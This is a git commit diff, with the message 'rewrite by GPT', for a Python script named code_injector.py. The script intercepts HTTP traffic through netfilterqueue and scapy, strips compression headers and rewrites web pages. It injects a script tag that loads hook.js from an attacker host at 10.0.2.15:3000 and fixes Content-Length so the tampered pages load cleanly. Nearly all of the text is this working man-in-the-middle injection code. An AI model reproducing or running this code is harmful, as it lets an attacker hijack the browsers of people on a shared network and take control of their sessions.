8f9724b55a657c8372e1040b67e96bf3ffb7628d
mr.wixXsid <62387629+mrwixxsid@users.noreply.github.com>
2023-08-22 07:12:18 +0600

    rewrite by GPT

--- code_injector.py
+++ code_injector.py
@@ -6,16 +6,20 @@ import re
 
 ack_list = []
 
-
 def set_load(packet, load):
+    """
+    Modify the packet's payload with the provided load and update relevant packet fields.
+    """
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     return packet
 
-
 def process_packet(packet):
+    """
+    Process packets captured by netfilterqueue.
+    """
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.Raw):
@@ -24,26 +28,29 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].dport == 80:
                 print("[+] Request")
                 print("=======================================================================================================")
+                # Remove Accept-Encoding header to prevent compression-related issues
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
             elif scapy_packet[scapy.TCP].sport == 80:
                 print("[+] Response")
                 print("=======================================================================================================")
-
-                # Add your keyword replacement logic here
+                
+                # Keyword replacement logic
                 if "example.com" in load:  # Replace "example.com" with your target keyword
                     replacement_code = '<div>New Content Here</div>'
                     load = load.replace("example.com", replacement_code)
-
+                
+                # Inject JavaScript code into response
                 injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                 load = load.replace("</body>", injection_code + "</body>")
-
+                
+                # Update Content-Length header to account for injected code
                 content_length_search = re.search("(?:Content-Length:\s)(\d+)", load)
                 if content_length_search and "text/html" in load:
                     content_length = content_length_search.group(1)
                     new_content_length = int(content_length) + len(injection_code)
                     load = load.replace(content_length, str(new_content_length))
-
+                
             if load != scapy_packet[scapy.Raw].load:
                 new_packet = set_load(scapy_packet, load)
                 packet.set_payload(bytes(new_packet))
@@ -51,11 +58,10 @@ def process_packet(packet):
             pass
     packet.accept()
 
-
 if __name__ == "__main__":
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
-
+    
     try:
         while True:
             queue.run()
